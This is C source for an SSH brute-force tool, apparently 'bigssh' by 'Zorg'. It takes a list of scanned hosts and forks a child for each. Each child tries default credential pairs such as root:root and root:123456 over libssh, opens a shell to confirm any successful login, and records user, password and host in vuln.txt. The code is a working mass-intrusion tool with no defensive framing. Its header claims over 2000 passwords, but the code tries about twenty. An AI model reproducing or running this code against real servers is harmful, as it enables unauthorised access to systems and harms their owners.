 /*
*the first brutessh was only for guest & test logins
*brutessh2 is a brute for sshd port which attempts to login as root with more than 2000 passwords.
*users guest , test , nobody and admin with no passwords are included.
*feel free to add more passwords and more users
*by Zorg
*For mass use a synscan :
*Eg: ./biggssh sship.txt
* Ok.Try This : Hostname root:12345
*/


#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <termios.h>
#include <sys/select.h>
#include <sys/time.h>
#include <signal.h>
#include <errno.h>
#include <libssh/libssh.h>
#include <libssh/sftp.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <netdb.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <time.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <netinet/in.h>

int flag;
int where;
int shell(SSH_SESSION *session){
struct timeval tv;
int err;
char cmd[]="uname -r -s\n";
char rd[2048];
BUFFER *readbuf=buffer_new();
time_t start,acum;


CHANNEL *channel;
channel = open_session_channel(session,1000,1000);
if(isatty(0))
err=channel_request_pty(channel);
// printf("channel request pty > %d\n",err);
err= channel_request_shell(channel);
// printf("channel request shell > %d\n",err);
start=time(0);
while (channel->open!=0)
{
usleep(500000);
err=channel_poll(channel,0);
if(err>0)
{
err=channel_read(channel,readbuf,0,0);
}
else
{
if(start+5<time(0))
{
//printf("5 secs passed\n");
return 1;
}
}
}
return 0;
}



void checkauth(char *user,char *password,char *host)
{
char warn[125]="";
SSH_SESSION *session;
SSH_OPTIONS *options;
int argc=1;
char *argv[]={"none"};
FILE *fp;

if(where%20==0)
{
fp=fopen("log.bigsshf","a");
fprintf(fp,"tring ssh %s@%s %s\n",user,host,password);
fclose(fp);
}
where++;
alarm(10);
options=ssh_getopt(&argc,argv);
options_set_username(options,user);
options_set_host(options,host);
session=ssh_connect(options);
if(!session) return ;

if(ssh_userauth_password(session,NULL,password) != AUTH_SUCCESS)
{
ssh_disconnect(session);
return;
}

if(shell(session))
{
if(flag) strcpy(warn,"DUP ");
fp=fopen("vuln.txt","a+");
fprintf(fp,"%s%s:%s:%s\n",warn,user,password,host);
printf("%sOk.TRY This : %s:%s:%s\n",warn,user,password,host);
flag=1;
}
else
printf("nologin -> %s:%s:%s\n",user,password,host);
}
int main(int argc, char **argv)
{
FILE *fp;
char *c;
char buff[1024];
int numforks;
int maxf;


if(argc!=2)
{
printf("./bigssh <sship.txt>\n");
printf("by Zorg\n");
exit(0);
}
unlink("log.bigsshf");
fp=fopen("sship.log","r");
if(fp==NULL) exit(printf("nu pot deschide sship.txt\n"));

maxf=atoi(argv[1]);
while(fgets(buff,sizeof(buff),fp))
{
c=strchr(buff,'\n');
if(c!=NULL) *c='\0';
if (!(fork()))
{
//child
where=0;
checkauth("test","test",buff);
checkauth("guest","guest",buff);
checkauth("admin","admins",buff);
checkauth("admin","admin",buff);
checkauth("user","user",buff);
checkauth("root","password",buff);
checkauth("root","root",buff);
checkauth("root","123456",buff);
checkauth("test","123456",buff);
checkauth("test","12345",buff);
checkauth("test","1234",buff);
checkauth("test","123",buff);
checkauth("root","!@#$%",buff);
checkauth("root","!@#$%^",buff);
checkauth("root","!@#$%^&",buff);
checkauth("root","!@#$%^&*",buff);
checkauth("root","*",buff);
checkauth("root","000000",buff);
checkauth("root","00000000",buff);
exit(0);
}
else
{
//parent
numforks++;
if (numforks > maxf)
for (numforks; numforks > maxf; numforks--)
wait(NULL);
}

}

}